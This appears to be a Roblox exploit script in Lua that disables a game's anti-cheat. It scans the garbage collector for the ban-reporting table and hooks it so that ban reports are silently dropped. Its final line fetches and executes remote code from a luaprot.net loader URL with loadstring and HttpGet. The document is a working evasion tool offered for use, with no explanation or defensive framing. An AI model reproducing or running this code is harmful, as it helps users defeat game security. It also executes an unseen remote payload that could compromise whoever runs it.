if not game:IsLoaded() then
    repeat
        wait()
    until game:IsLoaded()
end;

do --// Bypass
    if not getgenv().lhbypassloaded then
        local Players = game:GetService("Players")
        repeat
            task.wait()
        until Players.LocalPlayer ~= nil and game:IsLoaded()

        local LocalPlayer = Players.LocalPlayer
        local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

        Character:WaitForChild("HumanoidRootPart")
        Character:WaitForChild("Humanoid")
        Character:WaitForChild("Head")

        local Success, Error = pcall(function()
            local function Bypass(RecursiveTable, BanIndexValue)
                setrawmetatable(RecursiveTable, {
                    __newindex = function(Self, Index, Value)
                        if type(Value) == "table" and Index == BanIndexValue then
                            local Whitelisted = false
                            local Id1 = rawget(Value, 1)
                            local Id2 = rawget(Value, 2)
                            local Id4 = rawget(Value, 4)
                            local Length = rawlen(Value)

                            if Id1 then
                                if type(Id1) == "table" and Length == 2 and rawlen(Id1) == 1 and not rawget(Id1, "n") then
                                    local InsideValue = rawget(Id1, 1)
                                    local OutsideValue = rawget(Value, 2)

                                    if InsideValue and OutsideValue and tonumber(InsideValue) and tonumber(OutsideValue) then
                                        Whitelisted = true
                                    end
                                elseif type(Id1) == "number" and rawequal(Id1, 2) then
                                    if Length == 1 or (Length == 4 and rawequal(Id4, false)) then
                                        Whitelisted = true
                                    end
                                elseif type(Id1) == "string" and type(Id2) == "number" and rawequal(Id2, 7) then
                                    Whitelisted = true
                                end
                            end

                            if not Whitelisted then
                                return
                            end
                        end

                        return rawset(Self, Index, Value)
                    end,
                })

                return true
            end

            local Bypassed = false

            for _, Table in getgc(true) do
                if type(Table) ~= "table" or getrawmetatable(Table) then
                    continue
                end

                local FoundIndex, FoundRecursive = false, false
                for _, Value in Table do
                    if type(Value) == "number" and (rawequal(Value, 1) or rawequal(Value, 2) or rawequal(Value, 3) or rawequal(Value, 4)) then
                        FoundIndex = Value
                    end
                    if rawequal(Value, Table) then
                        FoundRecursive = Value
                    end
                end

                if FoundIndex and FoundRecursive and rawequal(rawget(Table, FoundIndex), nil) then
                    if Bypass(FoundRecursive, FoundIndex) then
                        Bypassed = true
                    end
                end
            end

            if not Bypassed then
                return LocalPlayer:Kick("run when fully loaded!")
            end

            getgenv().lhbypassloaded = true
        end)

        if not Success then
            LocalPlayer:Kick(tostring(Error))
        end
    end
end;

task.wait(2)

loadstring(game:HttpGet("https://luaprot.net/api/v2/loaders/get/99779786104572102737"))()
